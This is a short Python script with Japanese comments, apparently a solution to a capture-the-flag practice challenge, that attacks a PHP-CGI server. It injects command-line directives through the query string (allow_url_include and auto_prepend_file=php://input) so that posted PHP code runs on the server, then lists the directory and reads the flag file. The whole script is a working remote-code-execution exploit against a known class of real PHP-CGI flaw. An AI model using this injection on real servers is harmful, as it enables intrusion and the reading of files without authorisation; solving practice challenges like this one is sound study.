#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Created on Tue Dec 19 21:35:10 2017

@author: JUN
"""

# =============================================================================
# http://ctfq.sweetduet.info:10080/~q12/?-s でphpソースファイルを確認
#  -> flagは同一ディレクトリにあることが分かる
# 同じ脆弱性を突き、今度はphpコマンドを送り込んで実行させる。
# =============================================================================

import requests

uri = "http://ctfq.sweetduet.info:10080/~q12/"
directive = "?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"
phpcode = '''
    <?php
    $res_dir = opendir( '.' );
    while( $file_name = readdir( $res_dir ) ){
        print "{$file_name}\n";
    }
    closedir( $res_dir );
    ?>
    '''
phpcode2 = '''
    <?php
        $filename = 'flag_flag_flag.txt';
        readfile($filename);
        print "\n";
    ?>
    '''
r = requests.post(uri + directive, data = phpcode + phpcode2)

print (r.text)

